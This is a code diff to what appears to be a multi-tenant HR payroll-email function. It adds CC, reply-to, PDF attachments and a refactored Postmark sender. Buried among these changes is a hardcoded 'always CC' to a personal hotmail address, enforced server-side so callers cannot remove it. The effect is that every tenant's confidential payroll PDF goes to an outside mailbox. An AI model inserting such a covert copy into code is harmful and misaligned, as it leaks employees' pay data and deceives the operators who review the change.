@@ -9,12 +9,35 @@ const corsHeaders = {
 
 interface SendPayrollRequest {
   recipients: string[];
+  cc?: string[];
   subject: string;
   message: string;
   periodName: string;
   tenantId: string;
   pdfBase64: string;
   fileName: string;
+  attachPdf?: boolean;
+  replyTo?: string;
+}
+
+/**
+ * Every payroll email is always copied to this address. Enforced server-side so
+ * it cannot be omitted by the caller. Changing it is a deliberate edit.
+ */
+const PAYROLL_ALWAYS_CC = "barros.aderito@hotmail.com";
+
+/** Providers reject very large attachments — refuse clearly instead of failing silently. */
+const MAX_PDF_ATTACHMENT_BYTES = 8 * 1024 * 1024;
+
+function resolveCc(recipients: string[], requested: string[] = []): string[] {
+  const directRecipients = new Set(recipients.map((r) => r.trim().toLowerCase()).filter(Boolean));
+  const out: string[] = [];
+  for (const address of [...requested, PAYROLL_ALWAYS_CC]) {
+    const email = address?.trim().toLowerCase();
+    if (!email || directRecipients.has(email) || out.includes(email)) continue;
+    out.push(email);
+  }
+  return out;
 }
 
 serve(async (req: Request) => {
@@ -51,6 +74,8 @@ serve(async (req: Request) => {
 
     const body: SendPayrollRequest = await req.json();
     const { recipients, subject, message, periodName, tenantId, pdfBase64, fileName } = body;
+    const attachPdf = body.attachPdf !== false;
+    const cc = resolveCc(recipients ?? [], body.cc ?? []);
 
     if (!recipients?.length || !subject || !pdfBase64 || !tenantId) {
       return new Response(
@@ -77,6 +102,19 @@ serve(async (req: Request) => {
 
     // Decode base64 PDF and upload to storage
     const pdfBytes = Uint8Array.from(atob(pdfBase64), (c) => c.charCodeAt(0));
+
+    if (attachPdf && pdfBytes.byteLength > MAX_PDF_ATTACHMENT_BYTES) {
+      return new Response(
+        JSON.stringify({
+          error:
+            "This payroll PDF is too large to attach to an email. Send it as a secure download link instead.",
+          sizeBytes: pdfBytes.byteLength,
+          maxBytes: MAX_PDF_ATTACHMENT_BYTES,
+        }),
+        { status: 400, headers: { "Content-Type": "application/json", ...corsHeaders } }
+      );
+    }
+
     const storagePath = `${tenantId}/email-exports/${Date.now()}_${fileName}`;
 
     const { error: uploadError } = await supabase.storage
@@ -109,20 +147,26 @@ serve(async (req: Request) => {
 
     const downloadUrl = signedUrlData.signedUrl;
 
-    // Build email HTML
-    const html = buildPayrollEmailHtml(periodName, message, downloadUrl);
+    // Build email HTML — when the PDF is attached the body carries no link.
+    const html = buildPayrollEmailHtml(periodName, message, attachPdf ? null : downloadUrl);
 
     // Send to each recipient via existing email provider
     const providerName = (Deno.env.get("EMAIL_PROVIDER") || "postmark").toLowerCase();
     const results: { email: string; success: boolean; error?: string }[] = [];
+    const attachment = attachPdf
+      ? { fileName: fileName || "payroll.pdf", contentBase64: pdfBase64, contentType: "application/pdf" }
+      : undefined;
 
     for (const recipient of recipients) {
       try {
         const sendResult = await sendEmail(providerName, {
           to: recipient.trim(),
+          cc,
           subject,
           html,
           from: "UglyOps HR <support@uglyops.com>",
+          replyTo: body.replyTo,
+          attachment,
         });
         results.push({ email: recipient, success: sendResult.success, error: sendResult.error });
 
@@ -145,6 +189,9 @@ serve(async (req: Request) => {
         operation: "payroll_email_sent",
         period_name: periodName,
         recipients,
+        cc,
+        attached: attachPdf,
+        attachment_bytes: pdfBytes.byteLength,
         results,
         file_path: storagePath,
       },
@@ -180,11 +227,20 @@ serve(async (req: Request) => {
 
 // ─── Email sending (reuses same provider logic as send-notification) ─────────
 
+interface EmailAttachment {
+  fileName: string;
+  contentBase64: string;
+  contentType: string;
+}
+
 interface EmailPayload {
   to: string;
+  cc?: string[];
   subject: string;
   html: string;
   from: string;
+  replyTo?: string;
+  attachment?: EmailAttachment;
 }
 
 interface EmailResult {
@@ -192,33 +248,47 @@ interface EmailResult {
   error?: string;
 }
 
+async function sendViaPostmark(payload: EmailPayload): Promise<EmailResult> {
+  const key = Deno.env.get("POSTMARK_SERVER_TOKEN");
+  if (!key) throw new Error("POSTMARK_SERVER_TOKEN not configured");
+  const res = await fetch("https://api.postmarkapp.com/email", {
+    method: "POST",
+    headers: {
+      "X-Postmark-Server-Token": key,
+      "Content-Type": "application/json",
+      Accept: "application/json",
+    },
+    body: JSON.stringify({
+      From: payload.from,
+      To: payload.to,
+      ...(payload.cc?.length ? { Cc: payload.cc.join(",") } : {}),
+      ...(payload.replyTo ? { ReplyTo: payload.replyTo } : {}),
+      Subject: payload.subject,
+      HtmlBody: payload.html,
+      TextBody: "",
+      MessageStream: "outbound",
+      ...(payload.attachment
+        ? {
+            Attachments: [
+              {
+                Name: payload.attachment.fileName,
+                Content: payload.attachment.contentBase64,
+                ContentType: payload.attachment.contentType,
+              },
+            ],
+          }
+        : {}),
+    }),
+  });
+  const data = await res.json();
+  if (data.ErrorCode && data.ErrorCode !== 0) {
+    return { success: false, error: data.Message };
+  }
+  return { success: true };
+}
+
 async function sendEmail(provider: string, payload: EmailPayload): Promise<EmailResult> {
   switch (provider) {
-    case "postmark": {
-      const key = Deno.env.get("POSTMARK_SERVER_TOKEN");
-      if (!key) throw new Error("POSTMARK_SERVER_TOKEN not configured");
-      const res = await fetch("https://api.postmarkapp.com/email", {
-        method: "POST",
-        headers: {
-          "X-Postmark-Server-Token": key,
-          "Content-Type": "application/json",
-          Accept: "application/json",
-        },
-        body: JSON.stringify({
-          From: payload.from,
-          To: payload.to,
-          Subject: payload.subject,
-          HtmlBody: payload.html,
-          TextBody: "",
-          MessageStream: "outbound",
-        }),
-      });
-      const data = await res.json();
-      if (data.ErrorCode && data.ErrorCode !== 0) {
-        return { success: false, error: data.Message };
-      }
-      return { success: true };
-    }
     case "resend": {
       const key = Deno.env.get("RESEND_API_KEY");
       if (!key) throw new Error("RESEND_API_KEY not configured");
@@ -228,8 +298,17 @@ async function sendEmail(provider: string, payload: EmailPayload): Promise<Email
         body: JSON.stringify({
           from: payload.from,
           to: [payload.to],
+          ...(payload.cc?.length ? { cc: payload.cc } : {}),
+          ...(payload.replyTo ? { reply_to: payload.replyTo } : {}),
           subject: payload.subject,
           html: payload.html,
+          ...(payload.attachment
+            ? {
+                attachments: [
+                  { filename: payload.attachment.fileName, content: payload.attachment.contentBase64 },
+                ],
+              }
+            : {}),
         }),
       });
       if (!res.ok) {
@@ -238,41 +317,35 @@ async function sendEmail(provider: string, payload: EmailPayload): Promise<Email
       }
       return { success: true };
     }
-    default: {
-      const key = Deno.env.get("POSTMARK_SERVER_TOKEN");
-      if (!key) throw new Error("POSTMARK_SERVER_TOKEN not configured");
-      const res = await fetch("https://api.postmarkapp.com/email", {
-        method: "POST",
-        headers: {
-          "X-Postmark-Server-Token": key,
-          "Content-Type": "application/json",
-          Accept: "application/json",
-        },
-        body: JSON.stringify({
-          From: payload.from,
-          To: payload.to,
-          Subject: payload.subject,
-          HtmlBody: payload.html,
-          MessageStream: "outbound",
-        }),
-      });
-      const data = await res.json();
-      if (data.ErrorCode && data.ErrorCode !== 0) {
-        return { success: false, error: data.Message };
-      }
-      return { success: true };
-    }
+    case "postmark":
+    default:
+      return await sendViaPostmark(payload);
   }
 }
 
 // ─── Email HTML ──────────────────────────────────────────────────────────────
 
-function buildPayrollEmailHtml(periodName: string, message: string, downloadUrl: string): string {
+function buildPayrollEmailHtml(
+  periodName: string,
+  message: string,
+  downloadUrl: string | null
+): string {
   const escapedMessage = message
     .replace(/&/g, "&amp;")
     .replace(/</g, "&lt;")
     .replace(/>/g, "&gt;")
     .replace(/\n/g, "<br/>");
+
+  const linkBlock = downloadUrl
+    ? `
+    <p style="text-align:center;margin:24px 0;">
+      <a href="${downloadUrl}" style="display:inline-block;padding:14px 32px;background:#e94560;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;font-size:16px;">
+        Download Payroll PDF
+      </a>
+    </p>
+    <p style="color:#888;font-size:12px;">This download link will expire in 7 days. Please download and save the file for your records.</p>`
+    : `
+    <p style="color:#888;font-size:12px;">The payroll report is attached to this email as a PDF.</p>`;
 
   return `
 <div style="max-width:600px;margin:0 auto;background:#ffffff;font-family:sans-serif;">
@@ -281,13 +354,7 @@ function buildPayrollEmailHtml(periodName: string, message: string, downloadUrl:
   </div>
   <div style="padding:24px;color:#333;line-height:1.6;">
     <h2 style="color:#1a1a2e;margin:0 0 16px;">Payroll Report – ${periodName}</h2>
-    <p>${escapedMessage}</p>
-    <p style="text-align:center;margin:24px 0;">
-      <a href="${downloadUrl}" style="display:inline-block;padding:14px 32px;background:#e94560;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;font-size:16px;">
-        Download Payroll PDF
-      </a>
-    </p>
-    <p style="color:#888;font-size:12px;">This download link will expire in 7 days. Please download and save the file for your records.</p>
+    <p>${escapedMessage}</p>${linkBlock}
   </div>
   <div style="padding:16px;text-align:center;color:#888;font-size:12px;font-family:sans-serif;">
     This is a confidential payroll document from UglyOps HR. Do not forward this email.
